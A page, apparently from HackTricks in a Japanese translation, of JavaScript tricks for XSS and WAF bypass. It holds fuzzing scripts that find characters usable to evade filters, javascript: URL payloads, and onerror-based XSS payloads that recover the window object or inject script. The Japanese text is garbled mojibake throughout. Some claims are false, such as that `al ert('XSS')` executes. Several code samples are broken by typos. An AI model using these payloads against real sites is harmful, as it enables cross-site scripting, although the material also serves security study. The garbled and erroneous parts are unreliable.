# ãã®ä»–ã®JSãƒˆãƒªãƒƒã‚¯ã¨é–¢é€£æƒ…å ±

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** HackTricksã§**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## Javascript Fuzzing

### æœ‰åŠ¹ãªJSã‚³ãƒ¡ãƒ³ãƒˆæ–‡å­—
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
#!This is a 1 line comment, but "#!" must to be at the beggining of the line
-->This is a 1 line comment, but "-->" must to be at the beggining of the line


for (let j = 0; j < 128; j++) {
for (let k = 0; k < 128; k++) {
for (let l = 0; l < 128; l++) {
if (j == 34 || k ==34 || l ==34)
continue;
if (j == 0x0a || k ==0x0a || l ==0x0a)
continue;
if (j == 0x0d || k ==0x0d || l ==0x0d)
continue;
if (j == 0x3c || k ==0x3c || l ==0x3c)
continue;
if (
(j == 47 && k == 47)
||(k == 47 && l == 47)
)
continue;
try {
var cmd = String.fromCharCode(j) + String.fromCharCode(k) + String.fromCharCode(l) + 'a.orange.ctf"';
eval(cmd);
} catch(e) {
var err = e.toString().split('\n')[0].split(':')[0];
if (err === 'SyntaxError' || err === "ReferenceError")
continue
err = e.toString().split('\n')[0]
}
console.log(err,cmd);
}
}
}
//From: https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#bounty-pl33z

// From: Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 43). Kindle Edition.
log=[];
for(let i=0;i<=0xff;i++){
for(let j=0;j<=0xfff;j++){
try {
eval(`${String.fromCodePoint(i,j)}%$Â£234$`)
log.push([i,j])
}catch(e){}
}
}
console.log(log)//[35,33],[47,47]
```
### æœ‰åŠ¹ãªJSã®æ”¹è¡Œæ–‡å­—

JavaScriptã§ã¯ã€æ”¹è¡Œæ–‡å­—ã¯ç‰¹å®šã®æ–‡å­—åˆ—ã§è¡¨ã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã¯ã€æœ‰åŠ¹ãªJSã®æ”¹è¡Œæ–‡å­—ã®ä¸€è¦§ã§ã™ã€‚

- `\n`ï¼šæ”¹è¡Œ
- `\r`ï¼šå¾©å¸°
- `\u2028`ï¼šè¡ŒåŒºåˆ‡ã‚Šæ–‡å­—
- `\u2029`ï¼šæ®µè½åŒºåˆ‡ã‚Šæ–‡å­—

ã“ã‚Œã‚‰ã®æ”¹è¡Œæ–‡å­—ã¯ã€JavaScriptã®æ–‡å­—åˆ—å†…ã§ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10) //0x0a
String.fromCharCode(13) //0x0d
String.fromCharCode(8232) //0xe2 0x80 0xa8
String.fromCharCode(8233) //0xe2 0x80 0xa8

for (let j = 0; j < 65536; j++) {
try {
var cmd = '"aaaaa";'+String.fromCharCode(j) + '-->a.orange.ctf"';
eval(cmd);
} catch(e) {
var err = e.toString().split('\n')[0].split(':')[0];
if (err === 'SyntaxError' || err === "ReferenceError")
continue;
err = e.toString().split('\n')[0]
}
console.log(`[${err}]`,j,cmd);
}
//From: https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#bounty-pl33z
```
### é–¢æ•°å‘¼ã³å‡ºã—ã«ãŠã‘ã‚‹æœ‰åŠ¹ãªJSã‚¹ãƒšãƒ¼ã‚¹

In some cases, when trying to bypass filters or evade detection, it may be useful to insert spaces within a function call in JavaScript. These spaces can help obfuscate the code and make it harder for security mechanisms to detect malicious behavior.

ä»¥ä¸‹ã®ã‚ˆã†ãªå ´åˆã€ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ãŸã‚Šæ¤œå‡ºã‚’å›é¿ã™ã‚‹éš›ã«ã€JavaScriptã®é–¢æ•°å‘¼ã³å‡ºã—å†…ã«ã‚¹ãƒšãƒ¼ã‚¹ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒå½¹ç«‹ã¤å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¹ãƒšãƒ¼ã‚¹ã¯ã€ã‚³ãƒ¼ãƒ‰ã‚’æ›–æ˜§åŒ–ã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ãŒæ‚ªæ„ã®ã‚ã‚‹å‹•ä½œã‚’æ¤œå‡ºã™ã‚‹ã®ã‚’å›°é›£ã«ã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚

For example, instead of writing `alert('XSS')`, you can use spaces to break up the function call like this: `al ert('XSS')`. This can help bypass filters that are specifically looking for the `alert` keyword.

ä¾‹ãˆã°ã€`alert('XSS')`ã¨æ›¸ãä»£ã‚ã‚Šã«ã€ã‚¹ãƒšãƒ¼ã‚¹ã‚’ä½¿ã£ã¦é–¢æ•°å‘¼ã³å‡ºã—ã‚’åˆ†å‰²ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚`al ert('XSS')`ã¨ãªã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ç‰¹ã«`alert`ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’æ¢ã—ã¦ã„ã‚‹ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚

It's important to note that this technique may not work in all cases, as security mechanisms and filters can be designed to detect such obfuscation techniques. Therefore, it's crucial to thoroughly test and validate the effectiveness of this technique in the specific context you are working with.

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒã™ã¹ã¦ã®å ´åˆã§æ©Ÿèƒ½ã™ã‚‹ã‚ã‘ã§ã¯ãªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚„ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ã€ã“ã®ã‚ˆã†ãªæ›–æ˜§åŒ–æŠ€è¡“ã‚’æ¤œå‡ºã™ã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®åŠ¹æœã‚’ç¢ºå®Ÿã«ãƒ†ã‚¹ãƒˆã—ã€ç‰¹å®šã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§æœ‰åŠ¹ã§ã‚ã‚‹ã“ã¨ã‚’æ¤œè¨¼ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```javascript
// Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (pp. 40-41). Kindle Edition.

// Check chars that can be put in between in func name and the ()
function x(){}

log=[];
for(let i=0;i<=0x10ffff;i++){
try {
eval(`x${String.fromCodePoint(i)}()`)
log.push(i)
}catch(e){}
}

console.log(log)v//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,813 232,8233,8239,8287,12288,65279
```
### **æ–‡å­—åˆ—ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã®æœ‰åŠ¹ãªæ–‡å­—**

The following characters can be used to generate strings:

ä»¥ä¸‹ã®æ–‡å­—ã¯ã€æ–‡å­—åˆ—ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

- Alphanumeric characters (A-Z, a-z, 0-9)
- Special characters (!, @, #, $, %, ^, &, *, (, ), -, _, +, =, [, ], {, }, |, \, :, ;, ", ', <, >, ,, ., ?, /)
- Whitespace characters (space, tab, newline)

- è‹±æ•°å­—æ–‡å­—ï¼ˆA-Zã€a-zã€0-9ï¼‰
- ç‰¹æ®Šæ–‡å­—ï¼ˆï¼ã€@ã€#ã€$ã€%ã€^ã€&ã€*ã€ï¼ˆã€ï¼‰ã€-ã€_ã€+ã€=ã€[ã€]ã€{ã€}ã€|ã€\ã€:ã€;ã€"ã€'ã€<ã€>ã€,ã€.ã€?ã€/ï¼‰
- ç©ºç™½æ–‡å­—ï¼ˆã‚¹ãƒšãƒ¼ã‚¹ã€ã‚¿ãƒ–ã€æ”¹è¡Œï¼‰
```javascript
// Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (pp. 41-42). Kindle Edition.

// Check which pairs of chars can make something be a valid string
log=[];
for(let i=0;i<=0x10ffff;i++){
try {
eval(`${String.fromCodePoint(i)}%$Â£234${String.fromCodePoint(i)}`)
log.push(i)
}catch(e){}
}
console.log(log) //34,39,47,96
//single quote, quotes, backticks & // (regex)
```
### **ã‚µãƒ­ã‚²ãƒ¼ãƒˆãƒšã‚¢BF**

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯XSSã«ã¯ã‚ã¾ã‚Šå½¹ç«‹ã¡ã¾ã›ã‚“ãŒã€WAFã®ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ã«å½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã®Pythonã‚³ãƒ¼ãƒ‰ã¯2ãƒã‚¤ãƒˆã‚’å…¥åŠ›ã¨ã—ã¦å—ã‘å–ã‚Šã€æœ€åˆã®ãƒã‚¤ãƒˆãŒHighã‚µãƒ­ã‚²ãƒ¼ãƒˆãƒšã‚¢ã®æœ€å¾Œã®ãƒã‚¤ãƒˆã¨ä¸€è‡´ã—ã€æœ€å¾Œã®ãƒã‚¤ãƒˆãŒLowã‚µãƒ­ã‚²ãƒ¼ãƒˆãƒšã‚¢ã®æœ€å¾Œã®ãƒã‚¤ãƒˆã¨ä¸€è‡´ã™ã‚‹ã‚µãƒ­ã‚²ãƒ¼ãƒˆãƒšã‚¢ã‚’æ¤œç´¢ã—ã¾ã™ã€‚
```python
def unicode(findHex):
for i in range(0,0xFFFFF):
H = hex(int(((i - 0x10000) / 0x400) + 0xD800))
h = chr(int(H[-2:],16))
L = hex(int(((i - 0x10000) % 0x400 + 0xDC00)))
l = chr(int(L[-2:],16))
if(h == findHex[0]) and (l == findHex[1]):
print(H.replace("0x","\\u")+L.replace("0x","\\u"))
```
è©³ç´°æƒ…å ±ï¼š

* [https://github.com/dreadlocked/ctf-writeups/blob/master/nn8ed/README.md](https://github.com/dreadlocked/ctf-writeups/blob/master/nn8ed/README.md)
* [https://mathiasbynens.be/notes/javascript-unicode](https://mathiasbynens.be/notes/javascript-unicode) [https://mathiasbynens.be/notes/javascript-encoding](https://mathiasbynens.be/notes/javascript-encoding)

### `javascript{}:` ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ãƒ•ã‚¡ã‚¸ãƒ³ã‚°
```javascript
// Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 34). Kindle Edition.
log=[];
let anchor = document.createElement('a');
for(let i=0;i<=0x10ffff;i++){
anchor.href = `javascript${String.fromCodePoint(i)}:`;
if(anchor.protocol === 'javascript:') {
log.push(i);
}
}
console.log(log)//9,10,13,58
// Note that you could BF also other possitions of the use of multiple chars

// Test one option
let anchor = document.createElement('a');
anchor.href = `javascript${String.fromCodePoint(58)}:alert(1337)`;
anchor.append('Click me')
document.body.append(anchor)

// Another way to test
<a href="&#12;javascript:alert(1337)">Test</a>
```
### URL Fuzzing

URL Fuzzingã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆä¸­ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã™ã€‚ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®URLã«å¯¾ã—ã¦ç•°ãªã‚‹ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚„å€¤ã‚’æ³¨å…¥ã—ã¦ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æŒ™å‹•ã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚URL Fuzzingã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒäºˆæœŸã—ãªã„å…¥åŠ›ã«å¯¾ã—ã¦é©åˆ‡ã«å‡¦ç†ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

URL Fuzzingã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ãªæ”»æ’ƒã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

- ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®å€¤ã«ã‚ˆã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¯ãƒ©ãƒƒã‚·ãƒ¥
- ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®å€¤ã«ã‚ˆã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¨ãƒ©ãƒ¼
- ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®å€¤ã«ã‚ˆã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ›ãƒ¼ãƒ«

URL Fuzzingã¯ã€è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€å¤§é‡ã®ç•°ãªã‚‹ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚„å€¤ã‚’çŸ­æ™‚é–“ã§ãƒ†ã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€URL Fuzzingã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆã®ä¸€ç’°ã¨ã—ã¦è¡Œã‚ã‚Œã‚‹ã“ã¨ãŒå¤šã„ã§ã™ã€‚

URL Fuzzingã®ç›®çš„ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’ç‰¹å®šã—ã€ãã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€URL Fuzzingã¯ã€æ­£å½“ãªç›®çš„ã§ã®ã¿ä½¿ç”¨ã•ã‚Œã‚‹ã¹ãã§ã™ã€‚
```javascript
// Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (pp. 36-37). Kindle Edition.

// Before the protocol
a=document.createElement('a');
log=[];
for(let i=0;i<=0x10ffff;i++){
a.href = `${String.fromCodePoint(i)}https://hacktricks.xyz`;
if(a.hostname === 'hacktricks.xyz'){
log.push(i);
}
}
console.log(log) //0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32

// Between the slashes
a=document.createElement('a');
log=[];
for(let i=0;i<=0x10ffff;i++){
a.href = `/${String.fromCodePoint(i)}/hacktricks.xyz`;
if(a.hostname === 'hacktricks.xyz'){
log.push(i);
}
}
console.log(log) //9,10,13,47,92
```
### HTML Fuzzing

HTMLãƒ•ã‚¡ã‚¸ãƒ³ã‚°
```javascript
// Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 38). Kindle Edition.

// Fuzzing chars that can close an HTML comment

let log=[];
let div = document.createElement('div');
for(let i=0;i<=0x10ffff;i++){
div.innerHTML=`<!----${String.fromCodePoint(i)}><span></span>-->`;
if(div.querySelector('span')){
log.push(i);
}
}
console.log(log)//33,45,62
```
## **å±æ€§ã®åˆ†æ**

Portswiggerã®ãƒ„ãƒ¼ãƒ«**Hackability Inspector**ã¯ã€JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**å±æ€§**ã‚’åˆ†æã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚ãƒã‚§ãƒƒã‚¯ï¼š[https://portswigger-labs.net/hackability/inspector/?input=x.contentWindow\&html=%3Ciframe%20src=//subdomain1.portswigger-labs.net%20id=x%3E](https://portswigger-labs.net/hackability/inspector/?input=x.contentWindow\&html=%3Ciframe%20src=//subdomain1.portswigger-labs.net%20id=x%3E)

## **.map jsãƒ•ã‚¡ã‚¤ãƒ«**

* .map jsãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãƒˆãƒªãƒƒã‚¯ï¼š[https://medium.com/@bitthebyte/javascript-for-bug-bounty-hunters-part-2-f82164917e7](https://medium.com/@bitthebyte/javascript-for-bug-bounty-hunters-part-2-f82164917e7)
* ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ†æã™ã‚‹ãŸã‚ã«ã“ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š[https://github.com/paazmaya/shuji](https://github.com/paazmaya/shuji)

## "--"ä»£å…¥

æ¸›ç®—æ¼”ç®—å­`--`ã¯ã€ä»£å…¥æ¼”ç®—å­ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã®æ¼”ç®—å­ã¯å€¤ã‚’å—ã‘å–ã‚Šã€ãã‚Œã‚’1æ¸›ç®—ã—ã¾ã™ã€‚å€¤ãŒæ•°å€¤ã§ãªã„å ´åˆã€`NaN`ã«è¨­å®šã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€å¤‰æ•°ã®å†…å®¹ã‚’ç’°å¢ƒã‹ã‚‰å‰Šé™¤ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

![](<../../.gitbook/assets/image (553).png>)

![](<../../.gitbook/assets/image (554).png>)

## é–¢æ•°ã®ãƒˆãƒªãƒƒã‚¯

### .callã¨.apply

é–¢æ•°ã®**`.call`**ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚\
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœŸå¾…ã•ã‚Œã‚‹**æœ€åˆã®å¼•æ•°**ã¯**`this`ã®å€¤**ã§ã‚ã‚Šã€ä½•ã‚‚æŒ‡å®šã•ã‚Œã¦ã„ãªã„å ´åˆã¯**`window`**ãŒãã®å€¤ã«ãªã‚Šã¾ã™ï¼ˆ**`strict mode`**ãŒä½¿ç”¨ã•ã‚Œã¦ã„ãªã„é™ã‚Šï¼‰ã€‚
```javascript
function test_call(){
console.log(this.value); //baz
}
new_this={value:"hey!"}
test_call.call(new_this);

// To pass more arguments, just pass then inside .call()
function test_call() {
console.log(arguments[0]); //"arg1"
console.log(arguments[1]); //"arg2"
console.log(this); //[object Window]
}
test_call.call(null, "arg1", "arg2")

// If you use the "use strict" directive "this" will be null instead of window:
function test_call() {
"use strict";
console.log(this); //null
}
test_call.call(null)

//The apply function is pretty much exactly the same as the call function with one important difference, you can supply an array of arguments in the second argument:
function test_apply() {
console.log(arguments[0]); //"arg1"
console.log(arguments[1]); //"arg2"
console.log(this); //[object Window]
}
test_apply.apply(null, ["arg1", "arg2"])
```
### Arrow functions

ã‚¢ãƒ­ãƒ¼é–¢æ•°ã¯ã€1è¡Œã§é–¢æ•°ã‚’ã‚ˆã‚Šç°¡å˜ã«ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆç†è§£ã—ã¦ã„ã‚‹å ´åˆï¼‰ã€‚
```javascript
// Traditional
function (a){ return a + 1; }
// Arrow forms
a => a + 100;
a => {a + 100};

// Traditional
function (a, b){ return a + b + 1; }
// Arrow
(a, b) => a + b + 100;

// Tradictional no args
let a = 4;
let b = 2;
function (){ return a + b + 1; }

// Arrow
let a = 4;
let b = 2;
() => a + b + 1;
```
ã—ãŸãŒã£ã¦ã€ä»¥å‰ã®ã»ã¨ã‚“ã©ã®é–¢æ•°ã¯å®Ÿéš›ã«ã¯ç„¡æ„å‘³ã§ã™ã€‚ãªãœãªã‚‰ã€ãã‚Œã‚‰ã‚’ä¿å­˜ã—ã¦å‘¼ã³å‡ºã™ãŸã‚ã®å ´æ‰€ãŒãªã„ã‹ã‚‰ã§ã™ã€‚ä¾‹ãˆã°ã€`plusone` é–¢æ•°ã‚’ä½œæˆã—ã¾ã™ã€‚
```javascript
// Traductional
function plusone (a){ return a + 1; }

//Arrow
plusone = a => a + 100;
```
### ãƒã‚¤ãƒ³ãƒ‰é–¢æ•°

ãƒã‚¤ãƒ³ãƒ‰é–¢æ•°ã¯ã€ä¸ãˆã‚‰ã‚ŒãŸ`this`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã—ã¦ã€é–¢æ•°ã®**ã‚³ãƒ”ãƒ¼**ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
//This will use the this object and print "Hello World"
var fn = function ( param1, param2 ) {
console.info( this, param1, param2 );
}
fn('Hello', 'World')

//This will still use the this object and print "Hello World"
var copyFn = fn.bind();
copyFn('Hello', 'World')

//This will use the "console" object as "this" object inside the function and print "fixingparam1 Hello"
var bindFn_change = fn.bind(console, "fixingparam1");
bindFn_change('Hello', 'World')

//This will still use the this object and print "fixingparam1 Hello"
var bindFn_thisnull = fn.bind(null, "fixingparam1");
bindFn_change('Hello', 'World')

//This will still use the this object and print "fixingparam1 Hello"
var bindFn_this = fn.bind(this, "fixingparam1");
bindFn_change('Hello', 'World')
```
{% hint style="info" %}
**`bind`**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€é–¢æ•°ã‚’å‘¼ã³å‡ºã™éš›ã«ä½¿ç”¨ã•ã‚Œã‚‹**`this`**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ“ä½œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

### é–¢æ•°ã‚³ãƒ¼ãƒ‰ã®æ¼æ´©

é–¢æ•°ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«**ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹**å ´åˆã€ãã®é–¢æ•°ã®**ã‚³ãƒ¼ãƒ‰ã‚’å–å¾—**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
function afunc(){
return 1+1;
}
console.log(afunc.toString()); //This will print the code of the function
console.log(String(afunc)); //This will print the code of the function
console.log(this.afunc.toString()); //This will print the code of the function
console.log(global.afunc.toString()); //This will print the code of the function
```
å ´åˆã«ã‚ˆã£ã¦ã¯ã€**é–¢æ•°ã«åå‰ãŒãªã„**å ´åˆã§ã‚‚ã€**é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰**ã‚’å†…éƒ¨ã‹ã‚‰å‡ºåŠ›ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
(function (){ return arguments.callee.toString(); })()
(function (){ return arguments[0]; })("arg0")
```
ä»–ã®é–¢æ•°ã‹ã‚‰é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ï¼ˆã‚³ãƒ¡ãƒ³ãƒˆã‚‚å«ã‚€ï¼‰ã‚’æŠ½å‡ºã™ã‚‹ãŸã‚ã®**ãƒ©ãƒ³ãƒ€ãƒ ãª**æ–¹æ³•ã®ã„ãã¤ã‹:
```javascript
(function (){ return retFunc => String(arguments[0]) })(a=>{/* Hidden commment */})()
(function (){ return retFunc => Array(arguments[0].toString()) })(a=>{/* Hidden commment */})()
(function (){ return String(this)}).bind(()=>{ /* Hidden commment */ })()
(u=>(String(u)))(_=>{ /* Hidden commment */ })
(u=>_=>(String(u)))(_=>{ /* Hidden commment */ })()
```
## ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã®è„±å‡º - windowã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å›å¾©

Windowã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€alertã‚„evalãªã©ã®ã‚°ãƒ­ãƒ¼ãƒãƒ«ã«å®šç¾©ã•ã‚ŒãŸé–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```javascript
// Some ways to access window
window.eval("alert(1)")
frames
globalThis
parent
self
top //If inside a frame, this is top most window

// Access window from document
document.defaultView.alert(1)
// Access document from a node object
node = document.createElement('div')
node.ownerDocument.defaultView.alert(1)

// There is a path property on each error event whose last element is the window
<img src onerror=event.path.pop().alert(1337)>
// In other browsers the method is
<img src onerror=event.composedPath().pop().alert(1337)>
// In case of svg, the "event" object is called "evt"
<svg><image href=1 onerror=evt.composedPath().pop().alert(1337)>

// Abusing Error.prepareStackTrace to get Window back
Error.prepareStackTrace=function(error, callSites){
2   callSites.shift().getThis().alert(1337);
3 };
4 new Error().stack

// From an HTML event
// Events from HTML are executed in this context
with(document) {
with(element) {
//executed event
}
}
// Because of that with(document) it's possible to access properties of document like:
<img src onerror=defaultView.alert(1337)>
<img src onerror=s=createElement('script');s.append('alert(1337)');appendChild(s)>
```
{% endcode %}

## å€¤ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ™‚ã®ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆ

```javascript
Object.defineProperty(window, 'value', {
  get: function() {
    debugger;
    return this._value;
  },
  set: function(val) {
    this._value = val;
  }
});
```

This JavaScript code sets a breakpoint whenever the `value` property is accessed. It uses the `Object.defineProperty()` method to define a getter and setter for the `value` property. The getter function includes a `debugger` statement, which triggers a breakpoint in the browser's developer tools whenever the `value` property is accessed. The setter function simply assigns the value to the `_value` property.

